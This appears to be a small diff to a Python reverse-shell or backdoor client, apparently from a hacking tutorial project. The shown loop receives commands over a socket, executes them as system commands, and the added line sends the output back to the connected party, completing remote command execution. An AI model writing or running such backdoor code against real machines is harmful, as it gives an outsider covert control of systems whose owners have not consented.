@@ -29,6 +29,7 @@ while True:
     command = connection.recv(buffer_size) #receive, specify buffer size
     #print(received_data)
     command_result = execute_system_command(command)
+    connection.send(command_result)
 connection.close()
 #connect method takes a tuple
 #takes IP and port arguments
